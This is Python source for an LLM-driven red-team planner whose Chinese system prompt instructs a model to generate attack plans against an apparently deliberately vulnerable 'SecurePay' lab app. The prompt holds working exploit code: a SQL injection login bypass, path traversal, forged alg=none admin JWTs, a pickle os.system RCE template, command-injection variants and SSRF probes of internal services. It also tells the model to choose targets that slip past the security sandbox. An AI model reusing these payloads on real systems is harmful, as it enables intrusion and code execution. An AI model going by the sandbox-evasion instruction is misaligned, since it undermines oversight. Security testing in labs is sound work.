from __future__ import annotations

import json
import platform
from pathlib import Path
from typing import Any

from core.llm_client import DeepSeekClient
from core.memory_store import LayeredMemory
from core.settings import Settings


def _get_os_context() -> str:
    """Detect OS and return appropriate command context"""
    system = platform.system().lower()
    if system == "windows":
        return """
【重要 - Windows 环境注意事项】
当前运行环境是 Windows 系统！
"""
    else:
        return """
【Linux/macOS 环境】
"""


PLANNER_SYSTEM_BASE = r"""你是 Co-RedTeam 规划智能体。

【网络定位指令】：
目标系统运行在宿主机上！你生成的所有攻击请求 URL，必须使用 `http://host.docker.internal:9443` 作为基础地址（绝对禁止使用 localhost、127.0.0.1 或 target 作为域名）！

【环境情报】：
目标宿主机运行在 Windows 系统！在构造命令注入或 RCE payload 时，请使用 `whoami` 或 `dir` 替代 Linux 风格的 `id` 或 `ls`。
路径遍历必须使用 Windows 路径（禁止使用 /etc/passwd /etc/hosts 等 Linux 路径，Windows 上根本不存在！）：
  - ?file=../../../../Windows/win.ini
  - ?file=..\..\..\..\Windows\System32\drivers\etc\hosts
  - ?type=log&file=../../../../Windows/win.ini （用 type 参数切换 base 目录后再遍历）

【目标系统 API 路由表】（绝对铁律：只能使用以下真实存在的端点，禁止猜测或编造 URL 路径！）：
  POST /api/v1/auth/login          → 登录接口，参数: username, password （SQL注入漏洞点）
  POST /api/v1/auth/register       → 注册接口
  GET  /api/v1/users/<id>/profile  → 用户资料查询 （IDOR越权漏洞）
  POST /api/v1/users/<id>/update   → 更新用户资料
  GET  /api/v1/transactions        → 交易列表
  GET  /api/v1/transactions/<id>   → 交易详情
  POST /api/v1/payments/process    → 支付处理
  POST /api/v1/payments/webhook    → 支付回调
  GET  /api/v1/files/download?file=xxx   → 文件下载 （路径遍历漏洞，参数名 file）
  POST /api/v1/files/upload         → 文件上传
  POST /api/v1/admin/system/backup      → 系统备份 （命令注入漏洞，参数: output_path, database, log_pattern）
    【双层认证！必须三步攻击链，缺一不可！】
    ├─ Step1: GET /api/v1/admin/config/export（无需认证）→ 从响应 JSON 中取出 master_admin_key 字段值
    ├─ Step2: 手工构造 alg=none 的 JWT，payload 必须含 "role":"admin"
    │          构造方式: header=base64url({"alg":"none","typ":"JWT"}) payload=base64url({"sub":"1","role":"admin"}) sig=""
    │          最终 token = header + "." + payload + "."
    └─ Step3: POST 请求同时携带两个头: Authorization: Bearer <alg=none JWT>  +  X-Admin-Token: <master_admin_key>
  GET  /api/v1/admin/config/export      → 配置导出
  POST /api/v1/admin/config/import      → 配置导入 （Pickle反序列化漏洞，参数: config_data，值为base64编码的pickle数据）
  POST /api/v1/render/template           → 模板渲染 （SSTI服务端模板注入，参数: template）
  GET  /api/v1/search?q=xxx             → 搜索接口 （XSS漏洞，参数名 q）
  GET  /api/v1/redirect?next=xxx        → URL跳转 （开放重定向漏洞，参数名是 next，绝对不是 url！）
  GET  /api/v1/internal/proxy?url=xxx   → 内部代理 （SSRF漏洞，参数名 url）
    【SSRF绕过策略】：169.254.169.254 会被 WAF 拦截！优先测试内网服务：
    - url=http://127.0.0.1:6379/ （Redis）
    - url=http://localhost:5432/ （PostgreSQL）
    - url=http://127.0.0.1:8080/ （内网 HTTP 服务）
    - url=http://0.0.0.0:6379/ （0.0.0.0 绕过）

【输出增强指令】（绝对铁律：必须包含详细的调试信息！）：
所有 Python 代码必须在 print() 中输出完整的 HTTP 响应信息，包括：
1. 状态码和响应头
2. 响应体内容（即使为空也要显示）
3. 明确的攻击结果标识

示例：print(f"[SQL注入] Status: {r.status_code}, Headers: {dict(r.headers)}, Body: {r.text}")

【执行环境与命令规范】（绝对铁律）：
1. 绝对禁止使用 curl 或 shell！因为 shell 级别的多重引号转义极其容易导致 JSON 解析崩溃。
2. 所有的利用步骤必须统一使用 `type="python"`。
3. `command` 字段请直接写真实的 Python 裸代码，绝对不要在外面包 `python -c`（框架会自动帮你处理）。
4. 所有的网络请求必须使用 requests 库，并在最后 `print(r.status_code, r.text)` 输出结果，以供评估员验证。
5. 规避安全审查：在测试路径遍历或文件读取漏洞时，绝对禁止读取 /etc/passwd 或 /etc/shadow！请使用 /etc/hosts 或 /tmp/dummy.txt 等非敏感文件作为目标，以防被安全沙箱强行拦截。
6. 【最核心防崩规则】：Python 代码必须写成单行！多条语句之间必须使用分号 `;` 隔开，绝对禁止在代码中使用 `\\n` 换行符！

【JSON 格式要求】：
- 必须输出单个合法的 JSON 对象，严禁包含 Markdown 标记。
- 字段：version(1), plan_id(str), vuln_summary(str), rationale(str), steps(数组)
- 每个 step：id(整数), type("python"), command(字符串), purpose(字符串)

【任务】：
用户消息中会提供 `confirmed_vuln` 字段，包含目标系统 "SecurePay" 的所有已知漏洞。
你必须根据 `confirmed_vuln` 中的实际漏洞列表来生成攻击计划。每个漏洞至少生成一个对应的验证步骤。
计划必须覆盖 confirmed_vuln 中列出的所有漏洞类型，禁止只挑几个就收手。

【需要认证的端点强制规则】：
以下端点需要认证，必须先在前面步骤中获取 JWT token，后续步骤携带 Authorization 头：
  - GET /api/v1/transactions — 需要 Bearer token
  - POST /api/v1/admin/system/backup — 需要 Bearer token + X-Admin-Token
  - GET /api/v1/users/<id>/profile — 需要 Bearer token
任何需要认证的步骤，command 开头必须先构造 JWT alg=none token，再用 requests.get/post 时带上 headers={'Authorization': f'Bearer {token}'}。

【命令注入增强策略】：
output_path 参数使用分号注入可能失败（后端用 subprocess list 模式），必须同时在 log_pattern 参数也注入：
  - output_path=/tmp/test  log_pattern=*.log;whoami
  - output_path=/tmp/$(whoami) （shell 替换变量语法）
  - 如果第一个注入失败，后续步骤尝试 output_path=/tmp/test&whoami （URL 编码绕过）

【文件上传绕过策略】：
文件上传可能因目录不存在而 500。解决方案：先用路径遍历验证该服务是否处理上传，再尝试：
  - POST /api/v1/files/upload 先创建目录（如果失败，错误信息本身就是漏洞证据——泄露了服务器路径）
  - 尝试配合路径遍历上传到已知存在的目录

【正确示例】（注意 command 是用分号隔开的纯单行代码，URL 必须来自上面的路由表，输出必须包含详细调试信息。一个完整的计划应包含 10+ 步骤覆盖所有漏洞类型）：
{"id":1,"type":"python","command":"import requests; payload = \\"' UNION SELECT 1,'admin','password_hash','admin','System Administrator','admin@securepay.com','123-456-7890','123 Main St','123-45-6789','BANK-001',null -- \\"; r=requests.post('http://host.docker.internal:9443/api/v1/auth/login', json={'username': payload, 'password': 'x'}); print(f'[SQL注入] Status: {r.status_code}, Headers: {dict(r.headers)}, Body: {r.text}')","purpose":"SQL注入-UNION SELECT绕过登录（列数须与user_manager表一致）"}
{"id":2,"type":"python","command":"import requests; r=requests.get('http://host.docker.internal:9443/api/v1/files/download?file=../../../../Windows/win.ini'); print(f'[路径遍历] Status: {r.status_code}, Headers: {dict(r.headers)}, Body: {r.text}')","purpose":"路径遍历读取Windows文件（目标是Windows！用win.ini不要用/etc/hosts）"}
{"id":3,"type":"python","command":"import requests; import base64; import json; header=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode(); payload=base64.urlsafe_b64encode(json.dumps({'sub':'1','role':'admin'}).encode()).rstrip(b'=').decode(); token=f'{header}.{payload}.'; r=requests.get('http://host.docker.internal:9443/api/v1/transactions?user_id=1 OR 1=1--', headers={'Authorization':f'Bearer {token}'}); print(f'[SQL注入-交易列表] Status: {r.status_code}, Headers: {dict(r.headers)}, Body: {r.text}')","purpose":"SQL注入-交易列表（必须携带JWT alg=none token！否则401！）"}

【重要 - Pickle反序列化专用模板】（禁止用 exec/class 定义！用 tuple 直接构造 reduce，完全避免引号嵌套崩溃！）：
唯一正确写法（直接复用，仅修改 os.system 括号内的命令字符串）：
import requests; import base64; import pickle; import os; payload=base64.b64encode(pickle.dumps((os.system,('whoami',)))).decode(); r=requests.post('http://host.docker.internal:9443/api/v1/admin/config/import', json={'config_data':payload}); print(f'[Pickle反序列化] Status: {r.status_code}, Headers: {dict(r.headers)}, Body: {r.text}')
说明：pickle.dumps((os.system,('whoami',))) 利用 Python tuple callable 协议，无需定义任何 class，无换行符，无引号嵌套，100% 通过 validator 语法检查。禁止使用 exec、class、\\n。

【错误示例】（绝对不要出现）：
{"id":1,"type":"shell","command":"curl -sk ..."}
{"id":2,"type":"python","command":"python -c \\\"import requests; ...\\\""}
{"id":3,"type":"python","command":"import requests\\nr=... // 错误！禁止使用换行符"}
"""


def _build_memory_context(memory: LayeredMemory, vuln_summary: str) -> str:
    context_parts = []

    pattern_results = memory.query_patterns(
        query_text=f"{vuln_summary} 漏洞利用 攻击策略 payload",
        n_results=5,
    )
    if pattern_results:
        context_parts.append("【历史漏洞模式经验 (来自长期记忆)】：")
        for i, item in enumerate(pattern_results):
            context_parts.append(f"  模式{i+1}: {item['content']}")

    strategy_results = memory.query_strategies(
        query_text=f"{vuln_summary} 成功利用方法 攻击步骤",
        n_results=5,
    )
    if strategy_results:
        context_parts.append("\n【历史利用策略 (来自长期记忆)】：")
        for i, item in enumerate(strategy_results):
            stype = item.get("metadata", {}).get("strategy_type", "unknown")
            context_parts.append(f"  策略{i+1} [{stype}]: {item['content']}")

    tech_results = memory.query_tech(
        query_text=f"{vuln_summary} 命令 脚本 payload",
        n_results=5,
    )
    if tech_results:
        context_parts.append("\n【历史技术操作 (来自长期记忆)】：")
        for i, item in enumerate(tech_results):
            ttype = item.get("metadata", {}).get("tech_type", "unknown")
            context_parts.append(f"  技术{i+1} [{ttype}]: {item['content']}")

    return "\n".join(context_parts)


def _mock_plan(confirmed: dict[str, Any], memory: LayeredMemory) -> dict[str, Any]:
    vid = confirmed.get("vuln_id", "unknown")
    title = confirmed.get("title", "未命名漏洞")
    plan_id = f"mock-{vid}-1"
    
    os_info = platform.system()
    steps = [
        {
            "id": 1,
            "type": "shell",
            "command": f"echo Environment check on {os_info}",
            "purpose": f"环境自检({os_info})",
        },
        {
            "id": 2,
            "type": "shell",
            "command": f"echo Target: {title}",
            "purpose": "对齐漏洞上下文",
        },
    ]
    
    mem_stats = memory.get_stats()
    mem_context = _build_memory_context(memory, title)
    steps.append(
        {
            "id": 3,
            "type": "python",
            "command": f'python -c "print(\'[mock] layered memory stats: {mem_stats}\')"',
            "purpose": "展示已加载长期记忆规模（演示）",
        }
    )
    
    return {
        "version": 1,
        "plan_id": plan_id,
        "vuln_summary": title,
        "rationale": "MOCK：未调用大模型。配置 DEEPSEEK_API_KEY 并关闭 CO_REDTEAM_MOCK_LLM 以生成真实计划。",
        "steps": steps,
        "raw_memory_chars": len(mem_context),
        "memory_stats": mem_stats,
        "platform": os_info,
    }


def run_planner(
    settings: Settings,
    memory: LayeredMemory,
    confirmed: dict[str, Any],
    feedback: dict[str, Any] | None,
    out_path: Path,
    llm: DeepSeekClient | None,
) -> dict[str, Any]:
    if settings.mock_llm or llm is None:
        plan = _mock_plan(confirmed, memory)
        if feedback:
            plan["prior_feedback"] = feedback
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
        return plan

    vuln_summary = confirmed.get("title", "") or confirmed.get("description", "") or ""
    
    memory_context = _build_memory_context(memory, vuln_summary)
    
    user = {
        "confirmed_vuln": confirmed,
        "layered_memory": json.loads(memory.planning_context()),
        "retrieved_experience": memory_context,
        "prior_feedback": feedback,
    }

    os_context = _get_os_context()
    system_prompt_with_memory = PLANNER_SYSTEM_BASE + os_context
    
    if memory_context:
        system_prompt_with_memory += f"""

【长期记忆检索结果】
系统已从你的历史经验库中检索到以下相关经验，请参考这些经验来制定攻击计划：

{memory_context}

请结合以上历史经验，选择最合适的攻击策略和技术手段。
"""
    
    plan = llm.complete_json(
        system_prompt_with_memory,
        json.dumps(user, ensure_ascii=False),
    )
    plan.setdefault("version", 1)
    plan["platform"] = platform.system()
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(plan, ensure_ascii=False, indent=2), encoding="utf-8")
    return plan